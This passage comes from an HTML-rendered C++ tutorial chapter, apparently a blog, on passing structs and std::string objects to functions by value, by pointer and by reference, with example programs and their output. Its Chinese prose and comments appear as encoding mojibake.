p2)</span> </span>&#123;</span><br><span class="line">    Point midpoint;</span><br><span class="line">    midpoint.x = (p1.x + p2.x) / <span class="number">2.0</span>;</span><br><span class="line">    midpoint.y = (p1.y + p2.y) / <span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">return</span> midpoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾…åŠ©å‡½æ•°ï¼šæ‰“å° Point (æŒ‰å€¼ä¼ é€’)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_point</span><span class="params">(Point p)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Point start_point = &#123;<span class="number">1.0</span>, <span class="number">1.0</span>&#125;;</span><br><span class="line">    Point end_point = &#123;<span class="number">5.0</span>, <span class="number">7.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Start point: &quot;</span>;</span><br><span class="line">    print_point(start_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End point: &quot;</span>;</span><br><span class="line">    print_point(end_point);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°è®¡ç®—ä¸­ç‚¹</span></span><br><span class="line">    Point mid = find_midpoint(start_point, end_point);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Midpoint: &quot;</span>;</span><br><span class="line">    print_point(mid); <span class="comment">// è¾“å‡º: (3, 4)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­å†æ¬¡å±•ç¤ºäº†æŒ‰å€¼ä¼ é€’ç»“æ„ï¼ˆ<code>p1</code>, <code>p2</code> æ˜¯å‰¯æœ¬ï¼‰å’ŒæŒ‰å€¼è¿”å›ç»“æ„ï¼ˆ<code>midpoint</code> çš„å‰¯æœ¬è¢«è¿”å›ï¼‰ã€‚</p><h3 id="7-6-3-ä¼ é€’ç»“æ„çš„åœ°å€"><a href="#7-6-3-ä¼ é€’ç»“æ„çš„åœ°å€" class="headerlink" title="7.6.3 ä¼ é€’ç»“æ„çš„åœ°å€"></a>7.6.3 ä¼ é€’ç»“æ„çš„åœ°å€</h3><p>ä¸ºäº†é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„çš„å¼€é”€ï¼Œç‰¹åˆ«æ˜¯å½“ç»“æ„å¾ˆå¤§æ—¶ï¼Œæˆ–è€…å½“éœ€è¦å‡½æ•°èƒ½å¤Ÿä¿®æ”¹åŸå§‹ç»“æ„æ—¶ï¼Œå¯ä»¥ä¼ é€’ç»“æ„çš„<strong>åœ°å€</strong>ï¼ˆå³æŒ‡å‘ç»“æ„çš„æŒ‡é’ˆï¼‰è€Œä¸æ˜¯ç»“æ„æœ¬èº«ã€‚</p><p><strong>æ–¹æ³•:</strong></p><ol><li> <strong>å‡½æ•°å‚æ•°:</strong> å£°æ˜ä¸ºæŒ‡å‘ç»“æ„ç±»å‹çš„æŒ‡é’ˆ (<code>struct_type*</code>)ã€‚</li><li> <strong>å‡½æ•°è°ƒç”¨:</strong> ä½¿ç”¨åœ°å€è¿ç®—ç¬¦ <code>&amp;</code> è·å–ç»“æ„å˜é‡çš„åœ°å€ä¼ é€’ç»™å‡½æ•°ã€‚</li><li> <strong>è®¿é—®æˆå‘˜:</strong> åœ¨å‡½æ•°å†…éƒ¨ï¼Œéœ€è¦ä½¿ç”¨<strong>é—´æ¥æˆå‘˜è®¿é—®è¿ç®—ç¬¦ <code>-&gt;</code></strong> (ç®­å¤´è¿ç®—ç¬¦) æ¥è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„çš„æˆå‘˜ã€‚æˆ–è€…ï¼Œå…ˆè§£å¼•ç”¨æŒ‡é’ˆ <code>*ptr</code>ï¼Œç„¶åå†ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ <code>.</code>ï¼Œå³ <code>(*ptr).member</code>ã€‚<code>ptr-&gt;member</code> æ˜¯ <code>(*ptr).member</code> çš„ç®€æ´å†™æ³•ã€‚</li></ol><p><strong>ç¤ºä¾‹ï¼šæŒ‰æŒ‡é’ˆä¼ é€’ç»“æ„</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Rectangle</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> width;</span><br><span class="line">    <span class="keyword">double</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæ¥æ”¶æŒ‡å‘ Rectangle çš„æŒ‡é’ˆï¼Œè®¡ç®—é¢ç§¯</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ const è¡¨ç¤ºå‡½æ•°ä¸ä¼šé€šè¿‡æŒ‡é’ˆä¿®æ”¹ç»“æ„å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">calculate_area</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥ç©ºæŒ‡é’ˆæ˜¯ä¸€ç§å¥½çš„é˜²å¾¡æ€§ç¼–ç¨‹ä¹ æƒ¯</span></span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Null pointer passed to calculate_area.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ -&gt; è®¿é—®æˆå‘˜</span></span><br><span class="line">    <span class="keyword">return</span> rect_ptr-&gt;width * rect_ptr-&gt;height;</span><br><span class="line">    <span class="comment">// æˆ–è€…ä½¿ç”¨ (*rect_ptr).width * (*rect_ptr).height</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæ¥æ”¶æŒ‡å‘ Rectangle çš„æŒ‡é’ˆï¼Œå¹¶ä¿®æ”¹å…¶å°ºå¯¸ (æ”¾å¤§)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_rectangle</span><span class="params">(Rectangle* rect_ptr, <span class="keyword">double</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span> || factor &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Invalid arguments for scale_rectangle.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rect_ptr-&gt;width *= factor;  <span class="comment">// ä¿®æ”¹åŸå§‹ç»“æ„</span></span><br><span class="line">    rect_ptr-&gt;height *= factor; <span class="comment">// ä¿®æ”¹åŸå§‹ç»“æ„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾…åŠ©å‡½æ•°ï¼šæ‰“å° Rectangle (æŒ‰æŒ‡é’ˆä¼ é€’ï¼Œä½¿ç”¨ const)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_rectangle</span><span class="params">(<span class="keyword">const</span> Rectangle* rect_ptr)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (rect_ptr == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rectangle [Width=&quot;</span> &lt;&lt; rect_ptr-&gt;width &lt;&lt; <span class="string">&quot;, Height=&quot;</span> &lt;&lt; rect_ptr-&gt;height &lt;&lt; <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Rectangle box = &#123;<span class="number">10.0</span>, <span class="number">5.0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¼ é€’ box çš„åœ°å€ç»™ calculate_area</span></span><br><span class="line">    <span class="keyword">double</span> area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¼ é€’ box çš„åœ°å€ç»™ scale_rectangle ä»¥ä¿®æ”¹å®ƒ</span></span><br><span class="line">    scale_rectangle(&amp;box, <span class="number">2.0</span>); <span class="comment">// æ”¾å¤§ä¸¤å€</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scaled Box: &quot;</span>;</span><br><span class="line">    print_rectangle(&amp;box); <span class="comment">// æ‰“å°ä¿®æ”¹åçš„åŸå§‹ box</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Rectangle [Width=20, Height=10]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡æ–°è®¡ç®—é¢ç§¯</span></span><br><span class="line">    area = calculate_area(&amp;box);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; area &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æŒ‰æŒ‡é’ˆä¼ é€’çš„ä¼˜ç¼ºç‚¹:</strong></p><ul><li><strong>ä¼˜ç‚¹:</strong><ul><li>  æ•ˆç‡é«˜ï¼Œåªä¼ é€’åœ°å€ï¼Œä¸å¤åˆ¶æ•´ä¸ªç»“æ„ã€‚</li><li>  å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ç»“æ„æ•°æ®ã€‚</li></ul></li><li><strong>ç¼ºç‚¹:</strong><ul><li>  è¯­æ³•ç¨å¤æ‚ï¼ˆéœ€è¦ä½¿ç”¨ <code>&amp;</code> è·å–åœ°å€ï¼Œä½¿ç”¨ <code>-&gt;</code> æˆ– <code>(*).</code> è®¿é—®æˆå‘˜ï¼‰ã€‚</li><li>  å¯èƒ½æ„å¤–ä¿®æ”¹åŸå§‹æ•°æ®ï¼ˆé™¤éä½¿ç”¨ <code>const</code>ï¼‰ã€‚</li><li>  éœ€è¦å¤„ç†ç©ºæŒ‡é’ˆçš„å¯èƒ½æ€§ã€‚</li></ul></li></ul><p><strong>æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference):</strong></p><p>C++ è¿˜æä¾›äº†å¦ä¸€ç§é¿å…å¤åˆ¶å¹¶å…è®¸ä¿®æ”¹åŸå§‹æ•°æ®çš„æ–¹å¼ï¼š<strong>æŒ‰å¼•ç”¨ä¼ é€’</strong>ã€‚è¿™å°†åœ¨ç¬¬ 8 ç« è¯¦ç»†ä»‹ç»ã€‚æŒ‰å¼•ç”¨ä¼ é€’é€šå¸¸æ¯”æŒ‰æŒ‡é’ˆä¼ é€’æ›´ç®€æ´ã€æ›´å®‰å…¨ï¼ˆå› ä¸ºå®ƒé€šå¸¸ä¸æ¶‰åŠç©ºå¼•ç”¨çš„æ¦‚å¿µï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ (å°†åœ¨ç¬¬ 8 ç« è¯¦ç»†è®²è§£)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Circle</span> &#123;</span> <span class="keyword">double</span> radius; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‚æ•°æ˜¯ Circle çš„å¼•ç”¨ (åˆ«å)</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">circle_area_ref</span><span class="params">(<span class="keyword">const</span> Circle&amp; c)</span> </span>&#123; <span class="comment">// ä½¿ç”¨ const å¼•ç”¨é¿å…å¤åˆ¶ä¸”ä¸ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">3.14159</span> * c.radius * c.radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scale_circle_ref</span><span class="params">(Circle&amp; c, <span class="keyword">double</span> factor)</span> </span>&#123; <span class="comment">// ä½¿ç”¨é const å¼•ç”¨å…è®¸ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">if</span> (factor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        c.radius *= factor; <span class="comment">// ç›´æ¥ç”¨ . è®¿é—®æˆå‘˜ï¼Œä¿®æ”¹åŸå§‹å¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Circle circ = &#123;<span class="number">5.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    scale_circle_ref(circ, <span class="number">3.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Radius: &quot;</span> &lt;&lt; circ.radius &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 15</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New Area: &quot;</span> &lt;&lt; circle_area_ref(circ) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  ç»“æ„é»˜è®¤æŒ‰å€¼ä¼ é€’ç»™å‡½æ•°ï¼ˆåˆ›å»ºå‰¯æœ¬ï¼‰ã€‚</li><li>  å‡½æ•°å¯ä»¥æŒ‰å€¼è¿”å›ç»“æ„ï¼ˆè¿”å›å‰¯æœ¬ï¼‰ã€‚</li><li>  ä¸ºæé«˜æ•ˆç‡æˆ–å…è®¸ä¿®æ”¹åŸå§‹ç»“æ„ï¼Œå¯ä»¥ä¼ é€’ç»“æ„çš„åœ°å€ï¼ˆæŒ‡é’ˆ <code>struct_type*</code>ï¼‰ï¼Œä½¿ç”¨ <code>-&gt;</code> è®¿é—®æˆå‘˜ã€‚</li><li>  ä½¿ç”¨ <code>const</code> é…åˆæŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰å¯ä»¥é˜²æ­¢å‡½æ•°æ„å¤–ä¿®æ”¹ç»“æ„ã€‚</li><li>  æŒ‰å¼•ç”¨ä¼ é€’ (<code>struct_type&amp;</code>) æ˜¯å¦ä¸€ç§å¸¸ç”¨çš„é«˜æ•ˆä¼ é€’æ–¹å¼ï¼Œé€šå¸¸æ›´å—æ¬¢è¿ã€‚</li></ul><h2 id="7-7-å‡½æ•°å’Œ-string-å¯¹è±¡"><a href="#7-7-å‡½æ•°å’Œ-string-å¯¹è±¡" class="headerlink" title="7.7 å‡½æ•°å’Œ string å¯¹è±¡"></a>7.7 å‡½æ•°å’Œ string å¯¹è±¡</h2><p>C++ æ ‡å‡†åº“æä¾›çš„ <code>std::string</code> ç±»æ˜¯å¤„ç†å­—ç¬¦ä¸²çš„ç°ä»£ã€æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ–¹å¼ï¼Œå®ƒä¸ C-é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰æœ‰å¾ˆå¤§ä¸åŒã€‚å°† <code>std::string</code> å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æˆ–ä»å‡½æ•°è¿”å›å®ƒä»¬ï¼Œå…¶è¡Œä¸ºæ›´åƒç»“æ„ä½“ï¼Œä½†ä¹Ÿå—ç›Šäº C++ çš„å¼•ç”¨ç‰¹æ€§ã€‚</p><h3 id="ä¼ é€’-std-string-å¯¹è±¡"><a href="#ä¼ é€’-std-string-å¯¹è±¡" class="headerlink" title="ä¼ é€’ std::string å¯¹è±¡"></a>ä¼ é€’ <code>std::string</code> å¯¹è±¡</h3><p>ä¸ç»“æ„ç±»ä¼¼ï¼Œ<code>std::string</code> å¯¹è±¡é»˜è®¤ä¹Ÿæ˜¯<strong>æŒ‰å€¼ä¼ é€’ (Pass by Value)**ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ª <code>string</code> å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºè¯¥å¯¹è±¡çš„ä¸€ä¸ª</strong>å‰¯æœ¬**ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’ <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // åŒ…å« string å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å€¼æ¥æ”¶ string å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_string_value</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> str)</span> </span>&#123; <span class="comment">// str æ˜¯ message çš„å‰¯æœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹ string</span></span><br><span class="line">    str[<span class="number">0</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified copy inside function: \&quot;&quot;</span> &lt;&lt; str &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_string_value(message);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åŸå§‹ string æœªæ”¹å˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: &quot;Hello&quot;</span><br><span class="line">Inside function (value): &quot;Hello&quot;</span><br><span class="line">Modified copy inside function: &quot;Jello&quot;</span><br><span class="line">After call: &quot;Hello&quot;</span><br></pre></td></tr></table></figure><p><strong>æŒ‰å€¼ä¼ é€’ <code>std::string</code> çš„é—®é¢˜:</strong></p><p>è™½ç„¶æŒ‰å€¼ä¼ é€’å¯ä»¥ä¿æŠ¤åŸå§‹æ•°æ®ï¼Œä½† <code>std::string</code> å¯¹è±¡å¯èƒ½å­˜å‚¨å¾ˆé•¿çš„å­—ç¬¦ä¸²ã€‚æ¯æ¬¡è°ƒç”¨å‡½æ•°éƒ½å¤åˆ¶æ•´ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬å…¶å†…éƒ¨å¯èƒ½åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰å¯èƒ½ä¼šå¯¼è‡´æ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚</p><h3 id="æŒ‰å¼•ç”¨ä¼ é€’-std-string"><a href="#æŒ‰å¼•ç”¨ä¼ é€’-std-string" class="headerlink" title="æŒ‰å¼•ç”¨ä¼ é€’ std::string"></a>æŒ‰å¼•ç”¨ä¼ é€’ <code>std::string</code></h3><p>ä¸ºäº†é¿å…å¤åˆ¶å¼€é”€å¹¶å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ <code>string</code> å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚</p><p><strong>ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ <code>std::string</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŒ‰å¼•ç”¨æ¥æ”¶ string å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_string_ref</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>&amp; str_ref)</span> </span>&#123; <span class="comment">// str_ref æ˜¯ message çš„åˆ«å</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (reference): \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹å¼•ç”¨ï¼Œä¼šç›´æ¥ä¿®æ”¹åŸå§‹ string</span></span><br><span class="line">    str_ref += <span class="string">&quot; World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified original via reference: \&quot;&quot;</span> &lt;&lt; str_ref &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    modify_string_ref(message); <span class="comment">// ä¼ é€’å¼•ç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After call: \&quot;&quot;</span> &lt;&lt; message &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åŸå§‹ string å·²è¢«ä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Before call: 